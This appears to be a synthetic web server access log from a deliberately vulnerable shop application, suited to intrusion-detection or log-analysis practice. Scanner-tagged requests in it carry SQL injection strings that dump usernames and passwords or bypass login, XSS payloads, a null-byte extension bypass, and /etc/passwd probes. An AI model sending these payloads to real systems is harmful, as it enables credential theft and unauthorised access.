172.16.0.5 - - [29/Nov/2025:19:35:00 +0000] "GET /api/Challenges HTTP/1.1" 200 8598 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:00 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "sqlmap/1.5.11#stable"
66.77.88.99 - - [29/Nov/2025:19:35:01 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "python-requests/2.26.0"
66.77.88.99 - - [29/Nov/2025:19:35:01 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
203.55.11.22 - - [29/Nov/2025:19:35:01 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.0.2 - - [29/Nov/2025:19:35:02 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:02 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Nikto/2.1.0"
10.0.0.2 - - [29/Nov/2025:19:35:02 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:03 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "Nikto/2.1.0"
66.77.88.99 - - [29/Nov/2025:19:35:03 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "sqlmap/1.5.11#stable"
172.16.0.5 - - [29/Nov/2025:19:35:03 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:03 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:04 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:04 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:05 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:05 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "sqlmap/1.5.11#stable"
172.16.0.5 - - [29/Nov/2025:19:35:05 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:05 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:05 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:06 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
172.16.0.5 - - [29/Nov/2025:19:35:06 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:06 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "python-requests/2.26.0"
203.55.11.22 - - [29/Nov/2025:19:35:07 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "python-requests/2.26.0"
172.16.0.5 - - [29/Nov/2025:19:35:07 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:08 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
66.77.88.99 - - [29/Nov/2025:19:35:08 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
66.77.88.99 - - [29/Nov/2025:19:35:08 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "Nikto/2.1.0"
172.16.0.5 - - [29/Nov/2025:19:35:09 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:09 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
203.55.11.22 - - [29/Nov/2025:19:35:09 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "Nikto/2.1.0"
10.0.0.2 - - [29/Nov/2025:19:35:10 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:10 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:10 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:10 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "python-requests/2.26.0"
172.16.0.5 - - [29/Nov/2025:19:35:10 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:11 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.1.5 - - [29/Nov/2025:19:35:11 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:12 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:12 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:12 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
203.55.11.22 - - [29/Nov/2025:19:35:12 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
172.16.0.5 - - [29/Nov/2025:19:35:13 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:13 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "sqlmap/1.5.11#stable"
10.0.0.2 - - [29/Nov/2025:19:35:13 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:13 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "sqlmap/1.5.11#stable"
172.16.0.5 - - [29/Nov/2025:19:35:14 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:14 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:14 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:14 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:15 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Nikto/2.1.0"
203.55.11.22 - - [29/Nov/2025:19:35:15 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "sqlmap/1.5.11#stable"
172.16.0.5 - - [29/Nov/2025:19:35:16 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:16 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Nikto/2.1.0"
192.168.1.5 - - [29/Nov/2025:19:35:16 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:17 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:17 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:18 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:18 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.1.5 - - [29/Nov/2025:19:35:18 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:19 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "Nikto/2.1.0"
203.55.11.22 - - [29/Nov/2025:19:35:19 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "python-requests/2.26.0"
192.168.1.5 - - [29/Nov/2025:19:35:19 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:19 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "sqlmap/1.5.11#stable"
203.55.11.22 - - [29/Nov/2025:19:35:20 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "python-requests/2.26.0"
192.168.1.5 - - [29/Nov/2025:19:35:20 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:20 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:21 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "Nikto/2.1.0"
203.55.11.22 - - [29/Nov/2025:19:35:21 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Nikto/2.1.0"
66.77.88.99 - - [29/Nov/2025:19:35:21 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Nikto/2.1.0"
172.16.0.5 - - [29/Nov/2025:19:35:21 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:22 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "sqlmap/1.5.11#stable"
192.168.1.5 - - [29/Nov/2025:19:35:22 +0000] "GET /api/Challenges HTTP/1.1" 200 8632 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:22 +0000] "GET /rest/user/login?email='%20OR%20'1'='1&password=x HTTP/1.1" 500 809 "Nikto/2.1.0"
66.77.88.99 - - [29/Nov/2025:19:35:23 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
203.55.11.22 - - [29/Nov/2025:19:35:23 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "python-requests/2.26.0"
66.77.88.99 - - [29/Nov/2025:19:35:24 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "python-requests/2.26.0"
10.0.0.2 - - [29/Nov/2025:19:35:24 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:24 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "python-requests/2.26.0"
172.16.0.5 - - [29/Nov/2025:19:35:24 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:25 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:25 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:26 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "python-requests/2.26.0"
10.0.0.2 - - [29/Nov/2025:19:35:26 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:26 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:26 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "python-requests/2.26.0"
192.168.1.5 - - [29/Nov/2025:19:35:27 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:27 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Nikto/2.1.0"
10.0.0.2 - - [29/Nov/2025:19:35:28 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:28 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:28 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:29 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:29 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:30 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "Nikto/2.1.0"
172.16.0.5 - - [29/Nov/2025:19:35:30 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:31 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "sqlmap/1.5.11#stable"
192.168.1.5 - - [29/Nov/2025:19:35:31 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:31 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:32 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
66.77.88.99 - - [29/Nov/2025:19:35:32 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "python-requests/2.26.0"
66.77.88.99 - - [29/Nov/2025:19:35:32 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
66.77.88.99 - - [29/Nov/2025:19:35:33 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "Nikto/2.1.0"
192.168.1.5 - - [29/Nov/2025:19:35:33 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:33 +0000] "GET /api/Challenges HTTP/1.1" 200 8639 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:34 +0000] "GET / HTTP/1.1" 200 9020 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:35:34 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:35 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:35 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:35 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Nikto/2.1.0"
10.0.0.2 - - [29/Nov/2025:19:35:35 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:36 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
172.16.0.5 - - [29/Nov/2025:19:35:36 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:37 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:37 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:38 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
192.168.1.5 - - [29/Nov/2025:19:35:38 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:38 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.0.2 - - [29/Nov/2025:19:35:38 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:39 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:35:39 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:35:39 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:40 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "sqlmap/1.5.11#stable"
66.77.88.99 - - [29/Nov/2025:19:35:40 +0000] "GET /etc/passwd HTTP/1.1" 200 9027 "sqlmap/1.5.11#stable"
192.168.1.5 - - [29/Nov/2025:19:35:40 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:35:41 +0000] "GET /rest/products/search?q='%20OR%201=1%20-- HTTP/1.1" 500 954 "Nikto/2.1.0"
66.77.88.99 - - [29/Nov/2025:19:35:41 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.0.2 - - [29/Nov/2025:19:35:41 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:35:42 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "Nikto/2.1.0"
66.77.88.99 - - [29/Nov/2025:19:35:42 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "sqlmap/1.5.11#stable"
172.16.0.5 - - [29/Nov/2025:19:35:43 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
